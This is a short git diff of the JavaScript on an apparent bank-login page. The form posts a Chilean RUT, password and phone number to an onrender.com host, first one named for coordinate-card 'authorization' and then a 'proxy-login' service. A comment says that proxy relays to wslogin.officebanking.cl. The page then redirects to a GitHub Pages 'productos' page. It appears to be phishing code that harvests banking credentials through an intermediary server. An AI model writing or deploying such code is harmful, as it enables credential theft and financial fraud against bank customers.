@@ -74,7 +74,8 @@
       }
 
       try {
-        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/login", {
+        // Apunta a tu backend en Render, que reenvía a wslogin.officebanking.cl
+        const response = await fetch("https://tu-servicio.onrender.com/proxy-login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ rut, passwd, telefono })
@@ -82,8 +83,7 @@
         const data = await response.text();
         document.getElementById("resultado").innerText = data;
 
-        if(response.ok){
-          // Redirige al frontend (GitHub Pages) donde está productos.html
+        if(response.ok && data.includes("OK")){
           setTimeout(()=> window.location.href = "productos.html", 1500);
         }
       } catch (error) {
